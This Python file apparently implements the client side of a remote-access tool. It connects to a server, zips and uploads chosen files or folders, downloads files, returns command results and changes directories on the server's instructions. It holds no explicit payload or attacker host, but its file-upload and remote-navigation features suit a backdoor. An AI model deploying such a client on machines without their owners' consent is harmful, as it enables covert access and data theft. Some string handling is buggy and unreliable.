import socket
import os
import tempfile
import glob
import json
import string

import zipfile

HEADER_SIZE = 10


CHUNK_SIZE = 4 * 1024
END_DELIMETER = "*END_OF_FILE*"
COMMAND_DELIMETER = "<END_OF_COMMAND>"


def zip_it(to_download):

    # ziph is zipfile handle
    if os.path.isdir(to_download):
        zipped_name = to_download + ".zip"
        zipf = zipfile.ZipFile(zipped_name, 'w', zipfile.ZIP_DEFLATED)

        for root, dirs, files in os.walk(to_download):
            for file in files:
                zipf.write(os.path.join(root, file))
        zipf.close()
    else:
        base_name = os.path.basename(to_download)
        name, ext = os.path.splitext(base_name)
        toZip = name
        zipped_name = toZip+'.zip'
        zipfile.ZipFile(zipped_name, mode='w').write(base_name)

    return zipped_name

class ClientConnection:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def Connect(self, server_ip, server_port):
        self.socket.connect((server_ip, server_port))
        self.server_ip = server_ip
        self.server_port = server_port

    def receive_data(self):
        self.data_in_bytes = self.socket.recv(1024)
        self.data = self.data_in_bytes.decode("utf-8")
        return self.data

    def send_data(self, data):
        self.data_in_bytes = bytes(data, "utf-8")
        self.socket.send(self.data_in_bytes)

    def receive_file(self, filename):

        with open(filename, "wb") as file:
            while True:
                chunk = self.socket.recv(CHUNK_SIZE)

                if chunk.endswith(END_DELIMETER.encode()):

                    chunk = chunk[:-len(END_DELIMETER)]

                    file.write(chunk)
                    print("[+] Completed Transfer")
                    break

                if "NOT_FOUND".encode() in chunk:
                    print("[-] Unable to locate file")
                    break
                file.write(chunk)

    def send_command_result(self, command_result):
        print("[+] Sending Command Result")
        chunk = command_result + COMMAND_DELIMETER
        chunk_bytes = chunk.encode()

        self.socket.sendall(chunk_bytes)

    def send_file(self, file2download):

        print("[+] File/Folder selected : ", file2download)

        zipped_name = zip_it(file2download)
        file_content = b''
        with open(zipped_name, "rb") as file:
            file_content = file.read()
        self.send_data(zipped_name)
        self.socket.send(file_content+END_DELIMETER.encode())
        os.remove(zipped_name)

    def change_dir(self):
        curr_dir = os.getcwd()
        self.send_data(curr_dir)
        while True:

            command = self.receive_data()
            if command == "quit" or command == "stop" or command == "exit":
                print("[-] Exiting menu")
                break
            if command.startswith("cd"):
                path2move = command.strip("cd ")
                if os.path.exists(path2move):
                    os.chdir(path2move)
                    pwd = os.getcwd()
                    self.send_data(pwd)
                else:
                    self.send_data(os.getcwd())
            else:
                self.send_data(os.getcwd())

    def Close(self):
        self.socket.close()



